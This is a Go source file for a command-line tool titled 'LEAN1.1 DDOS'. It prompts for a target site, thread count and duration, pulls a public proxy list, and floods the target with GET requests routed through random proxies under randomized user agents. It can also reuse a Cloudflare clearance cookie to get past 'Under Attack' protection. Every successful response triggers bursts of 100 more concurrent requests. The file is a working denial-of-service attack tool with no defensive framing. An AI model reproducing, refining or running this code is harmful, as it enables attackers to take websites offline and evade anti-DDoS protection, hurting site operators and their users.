package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
)

func main() {
	var aaaa string
	var aaab int
	var aaac int
	fmt.Println("LEAN1.1 DDOS")
	fmt.Print("TARGET : ")
	fmt.Scan(&aaaa)
	fmt.Print("THREAD : ")
	fmt.Scan(&aaab)
	fmt.Print("TIME   : ")
	fmt.Scan(&aaac)
	fmt.Println("Website is protected by Cloudflare UAM or not? 1 if yes, 0 if no!")
	var cccc int
	fmt.Scan(&cccc)
	var ccca string
	if cccc == 1 {
		fmt.Println("Please enter the cookie:")
		fmt.Scan(&ccca)
	} else {
		fmt.Println("Website is not protected by Cloudflare UAM.")
	}
	fmt.Println("Bot : check!")
	aaba := time.Now().Add(time.Duration(aaac) * time.Second)
	aabb, err := http.Get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
	if err != nil {
		fmt.Println("Bot : err!")
	}
	defer aabb.Body.Close()
	aaca, _ := ioutil.ReadAll(aabb.Body)
	aacb := strings.Split(string(aaca), "\r\n")
	aacc := len(aacb)
	fmt.Print("Bot : ", aacc)
	fmt.Println(" Proxy ok!")
	for i := 0; i < aaab; i++ {
		go func() {
			for time.Until(aaba) > 0 {
				rd := rand.Int63n(100000)
				rand.Seed(rd)
				abaa := rand.Intn(len(aacb))
				abab := aacb[abaa]
				abac := "http://" + abab
				abba, _ := url.Parse(abac)
				abbb := &http.Client{
					Transport: &http.Transport{
						Proxy: http.ProxyURL(abba),
					},
					Timeout: 5 * time.Second,
				}
				abbc, _ := http.NewRequest("GET", aaaa, nil)
				if cccc == 1 {
					cccb := &http.Cookie{
						Name:  "cf_clearance",
						Value: ccca,
					}
					abbc.AddCookie(cccb)
				}
				abbc.Header.Set("User-Agent", browser.Random())
				baaa, err := abbb.Do(abbc)
				if err != nil {
					continue
				}
				if baaa.StatusCode != http.StatusOK {
					fmt.Printf("\033[31m%s slow request!\033[0m\n", abab)
					for i := 0; i < 10; i++ {
						_, err := abbb.Do(abbc)
						if err != nil {
							continue
						}
					}
				}
				if baaa.StatusCode == http.StatusOK {
					fmt.Printf("\033[31m%s send request!\033[0m\n", abab)
					for i := 0; i < 100; i++ {
						go func() {
							_, err := abbb.Do(abbc)
							if err != nil {
								return
							}
						}()
					}
				}
			}
		}()
	}
	time.Sleep(time.Duration(aaac) * time.Second)
	fmt.Println("Attack end")
}
